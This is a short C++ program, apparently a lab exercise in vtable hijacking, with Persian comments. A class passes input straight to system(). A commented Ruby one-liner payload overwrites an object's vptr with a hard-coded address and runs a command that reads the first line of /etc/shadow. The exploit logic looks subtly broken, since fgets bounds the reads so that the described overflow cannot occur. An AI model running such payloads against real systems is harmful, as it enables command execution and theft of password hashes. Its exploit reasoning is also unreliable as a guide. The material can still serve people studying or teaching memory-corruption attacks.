//
// Created by hosein-gh on 10/4/25.
//

#include <cstdlib>
#include <cstdio>
#include <cstring>

class CommandExecutor {
    public:
    virtual void execute(const char * command) {
        system(command);
    }
};

class Greeter {
public:
    virtual void sayHello(const char *name) {
        printf("Hello, %s!\n", name);
    }
};

void greet(Greeter *greeter);

void doNothing();

int test() {
    Greeter greeter;
    char buf[64];
    printf("you must be 18 years or older, are you?");

    std::fgets(buf,64,stdin);

    if (strcmp(buf, "y") == 0) {
        greet(&greeter);
        return 0;
    } else {
        return 1;
    }

}

void greet(Greeter *greeter) {
    char name[100];
    printf("What is your name? ");
    fgets(name, 100, stdin);
    name[strlen(name)-1] = '\0';
    greeter->sayHello(name);  // اینجا vtable hijack می‌شود
}

void doNothing() {
    CommandExecutor e;  // vtable این شیء هدف است
}

//ruby -e 'print "y\x00" +        # پاس کردن چک سن
  //  "A"*62 +                    # پر کردن بافر buf
  //  "\x88\x88\x04\x08" +        # overwrite vptr با آدرس vtable CommandExecutor (little-endian)
  //  "\n" +                      # پایان ورودی اول
   // "head -n 1 /etc/shadow\n"'  # دستور برای اجرا (مثال: خواندن خط اول shadow)
   // | ./main